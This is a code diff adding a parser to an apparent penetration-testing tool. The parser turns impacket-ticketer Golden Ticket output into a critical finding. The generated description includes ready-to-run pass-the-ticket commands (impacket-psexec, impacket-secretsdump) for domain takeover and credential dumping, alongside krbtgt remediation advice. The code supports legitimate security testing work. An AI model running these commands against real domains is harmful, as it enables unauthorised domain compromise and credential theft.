@@ -408,6 +408,111 @@ class CardADParserMixin:
             "success")
         return True
 
+    def _parse_ticketer_to_intel(self, tool, log: list) -> bool:
+        """impacket-ticketer output — a forged Golden/Silver ticket.
+
+        Ticketer runs ENTIRELY OFFLINE: it signs a Kerberos TGT with
+        the krbtgt NTLM hash and writes a .ccache.  The generic fallback
+        filed this as a low 'info' finding with a truncated log dump —
+        wrong: a Golden Ticket is full domain-wide persistence.  We emit
+        a dedicated CRITICAL finding that says WHO was impersonated,
+        WHERE the ticket landed, HOW to use it, and how to remediate.
+
+        Success is signalled by the 'Saving ticket in <file>.ccache'
+        line; without it we let the generic fallback handle the output.
+        """
+        import re
+        from utils.run_id import new_run_id
+
+        target = self._get_target() or "target"
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+
+        m_save = re.search(r"Saving ticket in\s+(\S+)", text)
+        if not m_save:
+            return False   # not a successful forge — leave the fallback
+        ccache = m_save.group(1)
+
+        m_cust = re.search(
+            r"Customizing ticket for\s+(\S+?)/(\S+)", text)
+        if m_cust:
+            domain, user = m_cust.group(1), m_cust.group(2)
+        else:
+            # Derive the impersonated user from the ccache name as a
+            # fallback (ticketer names it <user>.ccache by default).
+            user = ccache.rsplit("/", 1)[-1]
+            user = re.sub(r"\.ccache$", "", user) or "?"
+            domain = "?"
+
+        rid = new_run_id()
+        # The result block (what was forged) keeps the REAL values; the
+        # usage commands are a reusable template with <DC-IP> / <DOMAIN>
+        # / <DC-FQDN> placeholders the operator fills for the target.
+        # The impersonated user and the .ccache name stay real — they
+        # are the concrete product of THIS run.
+        desc = (
+            f"Golden Ticket forged OFFLINE and saved to {ccache}.\n"
+            f"\n"
+            f"  Impersonated : {user}@{domain}\n"
+            f"  Signed with  : krbtgt NTLM hash (domain {domain})\n"
+            f"  Ticket file  : {ccache}  (in HAWK's working directory)\n"
+            f"\n"
+            f"Impact: a forged Kerberos TGT that authenticates as "
+            f"{user}.  A Golden Ticket is signed by krbtgt itself, so "
+            f"the KDC trusts it for ANY service in the domain — with a "
+            f"privileged principal (Administrator / Domain Admin) that "
+            f"is full domain compromise.  It stays valid until the "
+            f"krbtgt password is rotated TWICE (Microsoft's "
+            f"double-tap); rotating {user}'s own password does NOT "
+            f"revoke it.\n"
+            f"\n"
+            f"Use it — pass-the-ticket from a Kali shell, run in HAWK's "
+            f"working directory (where {ccache} was saved).  Fill the "
+            f"<DC-IP> / <DOMAIN> / <DC-FQDN> placeholders for your "
+            f"target:\n"
+            f"\n"
+            f"  # 1. locate the forged ticket (ticketer wrote it to "
+            f"HAWK's cwd)\n"
+            f"  ls -l {ccache}\n"
+            f"\n"
+            f"  # 2. make the DC FQDN resolve — a Kerberos service "
+            f"ticket is bound to the DC hostname, not its IP, so the "
+            f"name must resolve (one-off /etc/hosts entry)\n"
+            f"  echo '<DC-IP> <DC-FQDN>' | sudo tee -a /etc/hosts\n"
+            f"\n"
+            f"  # 3. point Kerberos at the ticket, then confirm it "
+            f"loaded\n"
+            f"  export KRB5CCNAME={ccache}\n"
+            f"  klist\n"
+            f"\n"
+            f"  # 4. authenticate WITH the ticket: -k reads "
+            f"KRB5CCNAME, -no-pass skips the password, -dc-ip points "
+            f"the KDC lookup at the DC\n"
+            f"  impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+            f"<DOMAIN>/{user}@<DC-FQDN>\n"
+            f"  impacket-secretsdump -k -no-pass -dc-ip <DC-IP> "
+            f"<DOMAIN>/{user}@<DC-FQDN>\n"
+            f"\n"
+            f"  Note: run these in the SAME shell (export is "
+            f"per-shell), and the DC clock must be within 5 min of "
+            f"this host or the ticket fails with KRB_AP_ERR_SKEW.\n"
+            f"\n"
+            f"Remediation: reset the krbtgt password TWICE (e.g. "
+            f"Microsoft's New-KrbtgtKeys.ps1) to invalidate every "
+            f"existing golden ticket, then investigate how krbtgt / "
+            f"DCSync access was obtained.")
+        title = f"GOLDEN TICKET forged — {user}@{domain} on {target}"
+
+        # replace=True: re-forging re-writes the same ticket, so
+        # overwrite rather than stacking duplicate finding bodies.
+        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
+            title=title, description=desc,
+            severity="critical", source=tool.name,
+            linked_run_id=rid, replace=True))
+        self.app.terminal.write(
+            f"  [!] GOLDEN TICKET forged for {user}@{domain} — "
+            f"CRITICAL, see Target Intel.", "error")
+        return True
+
     def _parse_addcomputer_to_intel(self, tool, log: list) -> bool:
         """impacket-addcomputer output — handles three scenarios:
 
